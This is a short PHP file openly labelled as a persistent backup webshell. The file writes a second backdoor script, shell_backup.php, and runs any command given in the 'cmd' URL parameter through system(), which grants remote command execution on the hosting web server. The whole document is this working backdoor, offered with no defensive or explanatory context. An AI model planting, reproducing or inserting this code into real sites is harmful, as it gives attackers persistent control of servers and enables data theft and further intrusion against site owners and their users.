<?php
// ================================================================
// WEBSHELL PERSISTENT - Backup Shell
// ================================================================

if (!file_exists('shell_backup.php')) {
    file_put_contents('shell_backup.php', '<?php system($_GET["cmd"]); ?>');
}

if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>